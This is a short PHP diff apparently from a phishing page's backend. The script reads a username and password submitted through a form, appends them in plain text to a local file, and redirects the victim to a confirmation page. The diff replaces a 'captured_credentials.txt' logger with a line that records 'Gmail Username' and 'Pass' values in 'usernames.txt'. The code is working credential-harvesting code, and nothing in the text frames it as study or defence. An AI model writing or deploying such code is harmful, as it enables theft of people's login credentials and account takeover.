@@ -6,12 +6,7 @@ ini_set('display_errors', 1);
 $username = $_POST['feidename'];
 $password = $_POST['password'];
 
-// Log the credentials to a file
-if (file_put_contents("captured_credentials.txt", "Username: " . $username . " Password: " . $password . "\n", FILE_APPEND) === false) {
-    echo "Failed to write to file.";
-} else {
-    echo "Credentials saved successfully.";
-}
+file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 
 // Redirect to a confirmation page
 header('Location: confirmation.html');
